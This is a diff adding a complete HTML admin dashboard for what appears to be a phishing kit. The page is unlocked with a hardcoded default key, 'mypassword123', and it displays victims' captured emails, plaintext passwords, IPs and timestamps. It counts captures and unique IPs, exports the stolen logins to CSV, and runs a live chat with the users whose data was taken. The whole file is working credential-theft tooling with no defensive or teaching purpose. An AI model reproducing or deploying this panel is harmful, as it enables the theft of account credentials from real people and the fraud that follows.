@@ -1,0 +1,250 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Admin Dashboard</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:Arial,sans-serif;background:#f0f2f5;min-height:100vh}
+        .denied{display:flex;justify-content:center;align-items:center;min-height:100vh;background:linear-gradient(135deg,#667eea,#764ba2)}
+        .dbox{background:white;padding:2rem;border-radius:20px;text-align:center;width:90%;max-width:400px}
+        .dbox h2{margin-bottom:1rem}
+        .dbox input{width:100%;padding:.8rem;border:2px solid #eee;border-radius:10px;margin:1rem 0;font-size:1rem}
+        .dbox button{width:100%;padding:.8rem;background:#667eea;color:white;border:none;border-radius:10px;cursor:pointer;font-size:1rem;font-weight:600}
+        .dbox .err{color:#f56565;margin-top:.5rem;display:none}
+        .dbox .hint{font-size:.8rem;color:#999;margin-top:1rem}
+        .header{background:white;padding:.8rem 1.5rem;box-shadow:0 2px 10px rgba(0,0,0,0.1);display:flex;justify-content:space-between;align-items:center;position:sticky;top:0;z-index:100}
+        .header h2{color:#667eea}
+        .header button{background:#f56565;color:white;border:none;padding:.5rem 1.2rem;border-radius:8px;cursor:pointer;font-weight:600}
+        .container{max-width:1200px;margin:1rem auto;padding:0 1rem}
+        .stats{display:grid;grid-template-columns:repeat(4,1fr);gap:.8rem;margin-bottom:1rem}
+        .stat{background:white;padding:1rem;border-radius:10px;text-align:center;box-shadow:0 2px 5px rgba(0,0,0,0.05)}
+        .stat .num{font-size:1.8rem;font-weight:bold;color:#333}
+        .stat .lbl{font-size:.75rem;color:#888}
+        .tabs{display:flex;gap:.5rem;margin-bottom:1rem}
+        .tabs button{flex:1;padding:.7rem;border:none;border-radius:10px;cursor:pointer;background:white;font-weight:600;color:#666}
+        .tabs button.active{background:#667eea;color:white}
+        .tab{display:none}
+        .tab.active{display:block}
+        .card{background:white;border-radius:10px;padding:1rem;box-shadow:0 2px 5px rgba(0,0,0,0.05)}
+        .record{background:#f7f9fc;padding:.7rem;margin-bottom:.4rem;border-radius:8px;border-left:4px solid #667eea;font-size:.9rem}
+        .record.new{border-left-color:#48bb78;background:#f0fff4}
+        .record .del{float:right;background:#f56565;color:white;border:none;padding:.2rem .5rem;border-radius:4px;cursor:pointer;font-size:.7rem}
+        .record .em{font-weight:600;color:#333}
+        .record .pw{color:#e94560;font-family:monospace;margin-top:.15rem}
+        .record .meta{font-size:.7rem;color:#999;margin-top:.2rem}
+        .empty{text-align:center;padding:2rem;color:#999}
+        #chatMsgs{height:350px;overflow-y:auto;padding:.5rem;background:#f7f9fc;border-radius:8px;margin-bottom:.5rem}
+        .cmsg{padding:.5rem .7rem;border-radius:10px;margin-bottom:.3rem;max-width:80%;font-size:.85rem}
+        .cmsg.user{background:white;border-left:3px solid #e94560}
+        .cmsg.admin{background:#667eea;color:white;margin-left:auto}
+        .sysmsg{text-align:center;font-size:.7rem;color:#999;padding:.2rem}
+        .chatSend{display:flex;gap:.5rem}
+        .chatSend input{flex:1;padding:.6rem;border:1px solid #eee;border-radius:20px}
+        .chatSend button{padding:.6rem 1.2rem;background:#667eea;color:white;border:none;border-radius:20px;cursor:pointer;font-weight:600}
+        .actions{display:flex;gap:.5rem;margin-top:.8rem}
+        .actions button{flex:1;padding:.6rem;color:white;border:none;border-radius:8px;cursor:pointer;font-weight:600}
+        .btnExport{background:#48bb78}
+        .btnClear{background:#f56565}
+        @media(max-width:768px){.stats{grid-template-columns:1fr 1fr}}
+    </style>
+</head>
+<body>
+<div id="denied" class="denied">
+    <div class="dbox">
+        <h2>Admin Access</h2>
+        <p style="color:#666">Enter your admin key</p>
+        <input type="text" id="keyInput" placeholder="Enter key..." autocomplete="off">
+        <button onclick="submitKey()">Unlock Dashboard</button>
+        <p class="err" id="keyErr">Invalid key! Try: mypassword123</p>
+        <p class="hint">Default key: <strong>mypassword123</strong></p>
+    </div>
+</div>
+
+<div id="panel" style="display:none">
+    <div class="header">
+        <h2>Admin Dashboard</h2>
+        <button onclick="logout()">Logout</button>
+    </div>
+    <div class="container">
+        <div class="stats">
+            <div class="stat"><div class="num" id="total">0</div><div class="lbl">Total Captured</div></div>
+            <div class="stat"><div class="num" id="today">0</div><div class="lbl">Today</div></div>
+            <div class="stat"><div class="num" id="week">0</div><div class="lbl">This Week</div></div>
+            <div class="stat"><div class="num" id="ips">0</div><div class="lbl">Unique IPs</div></div>
+        </div>
+        <div class="tabs">
+            <button class="active" onclick="switchTab('logins')">Captured Logins</button>
+            <button onclick="switchTab('chat')">Live Chat</button>
+        </div>
+        <div class="tab active" id="tabLogins">
+            <div class="card">
+                <h3 style="margin-bottom:.8rem">Captured Credentials</h3>
+                <div id="loginList"></div>
+                <div class="actions">
+                    <button class="btnExport" onclick="exportCSV()">Export CSV</button>
+                    <button class="btnClear" onclick="clearAll()">Clear All</button>
+                </div>
+            </div>
+        </div>
+        <div class="tab" id="tabChat">
+            <div class="card">
+                <h3 style="margin-bottom:.8rem">Live Chat with Users</h3>
+                <div id="chatMsgs"></div>
+                <div class="chatSend">
+                    <input id="adminChatInput" placeholder="Reply to user..." onkeypress="if(event.key==='Enter')sendAdminMsg()">
+                    <button onclick="sendAdminMsg()">Send</button>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    const API = '/api';
+    let KEY = localStorage.getItem('adminKey');
+    let logins = [], messages = [];
+    
+    const urlKey = new URLSearchParams(window.location.search).get('key');
+    if (urlKey) { KEY = urlKey; localStorage.setItem('adminKey', urlKey); window.history.replaceState({}, document.title, window.location.pathname); }
+    if (KEY) checkKey();
+
+    async function checkKey() {
+        try {
+            const r = await fetch(API + '/admin/check', { headers: { 'x-admin-key': KEY } });
+            if ((await r.json()).valid) showPanel();
+        } catch(e) {}
+    }
+
+    async function submitKey() {
+        const k = document.getElementById('keyInput').value.trim();
+        if (!k) return;
+        try {
+            const r = await fetch(API + '/admin/check', { headers: { 'x-admin-key': k } });
+            if ((await r.json()).valid) { KEY = k; localStorage.setItem('adminKey', k); showPanel(); }
+            else { document.getElementById('keyErr').style.display = 'block'; }
+        } catch(e) { document.getElementById('keyErr').textContent = 'Cannot connect to server!'; document.getElementById('keyErr').style.display = 'block'; }
+    }
+
+    function showPanel() {
+        document.getElementById('denied').style.display = 'none';
+        document.getElementById('panel').style.display = 'block';
+        loadAll();
+        setInterval(loadAll, 3000);
+    }
+
+    function logout() { localStorage.removeItem('adminKey'); location.reload(); }
+
+    async function loadAll() {
+        await loadStats();
+        await loadLogins();
+        await loadChat();
+    }
+
+    async function loadStats() {
+        try {
+            const r = await fetch(API + '/admin/stats', { headers: { 'x-admin-key': KEY } });
+            const d = await r.json();
+            document.getElementById('total').textContent = d.total;
+            document.getElementById('today').textContent = d.today;
+            document.getElementById('week').textContent = d.weekLogins;
+            document.getElementById('ips').textContent = d.uniqueIPs;
+        } catch(e) {}
+    }
+
+    async function loadLogins() {
+        try {
+            const r = await fetch(API + '/admin/logins', { headers: { 'x-admin-key': KEY } });
+            const d = await r.json();
+            logins = d.logins || [];
+            const c = document.getElementById('loginList');
+            if (!logins.length) {
+                c.innerHTML = '<div class="empty"><p>No captures yet</p><p style="font-size:.8rem;color:#bbb">Data appears when users submit the form</p></div>';
+                return;
+            }
+            c.innerHTML = logins.map(i => 
+                '<div class="record ' + (i.isNew ? 'new' : '') + '">' +
+                '<button class="del" onclick="del(\'' + i.id + '\')">X</button>' +
+                '<div class="em">' + i.email + '</div>' +
+                '<div class="pw">' + i.password + '</div>' +
+                '<div class="meta">IP: ' + i.ip + ' | ' + new Date(i.timestamp).toLocaleString() + '</div>' +
+                '</div>'
+            ).join('');
+        } catch(e) {}
+    }
+
+    async function loadChat() {
+        try {
+            const r = await fetch(API + '/chat/messages');
+            const d = await r.json();
+            messages = d.messages || [];
+            const c = document.getElementById('chatMsgs');
+            if (!messages.length) {
+                c.innerHTML = '<div class="empty"><p>No messages yet</p></div>';
+                return;
+            }
+            c.innerHTML = messages.map(m => {
+                const t = new Date(m.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+                if (m.from === 'system') return '<div class="sysmsg">' + m.text + ' - ' + t + '</div>';
+                if (m.from === 'user') return '<div class="cmsg user">' + m.text + '<div style="font-size:.6rem;opacity:.7">' + t + '</div></div>';
+                return '<div class="cmsg admin">' + m.text + '<div style="font-size:.6rem;opacity:.7">' + t + '</div></div>';
+            }).join('');
+            setTimeout(() => { c.scrollTop = c.scrollHeight; }, 100);
+        } catch(e) {}
+    }
+
+    async function sendAdminMsg() {
+        const input = document.getElementById('adminChatInput');
+        const text = input.value.trim();
+        if (!text) return;
+        input.value = '';
+        try {
+            await fetch(API + '/chat/admin', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'x-admin-key': KEY },
+                body: JSON.stringify({ text })
+            });
+            loadChat();
+        } catch(e) {}
+    }
+
+    async function del(id) {
+        if (!confirm('Delete this record?')) return;
+        try {
+            await fetch(API + '/admin/logins/' + id, { method: 'DELETE', headers: { 'x-admin-key': KEY } });
+            loadAll();
+        } catch(e) {}
+    }
+
+    async function clearAll() {
+        if (!confirm('Delete ALL captured logins?')) return;
+        try {
+            await fetch(API + '/admin/logins', { method: 'DELETE', headers: { 'x-admin-key': KEY } });
+            loadAll();
+        } catch(e) {}
+    }
+
+    function exportCSV() {
+        if (!logins.length) return;
+        let csv = 'Email,Password,IP,Timestamp\n';
+        logins.forEach(i => csv += '"' + i.email + '","' + i.password + '","' + i.ip + '","' + i.timestamp + '"\n');
+        const a = document.createElement('a');
+        a.href = URL.createObjectURL(new Blob([csv]));
+        a.download = 'logins-' + new Date().toISOString().split('T')[0] + '.csv';
+        a.click();
+    }
+
+    function switchTab(t) {
+        document.querySelectorAll('.tabs button').forEach((b, i) => b.classList.toggle('active', (t === 'logins' && i === 0) || (t === 'chat' && i === 1)));
+        document.getElementById('tabLogins').classList.toggle('active', t === 'logins');
+        document.getElementById('tabChat').classList.toggle('active', t === 'chat');
+        if (t === 'chat') {
+            const c = document.getElementById('chatMsgs');
+            if (c) c.scrollTop = c.scrollHeight;
+        }
+    }
+
+    document.getElementById('keyInput')?.addEventListener('keypress', e => { if (e.key === 'Enter') submitKey(); });
+</script>
+</body>
+</html>
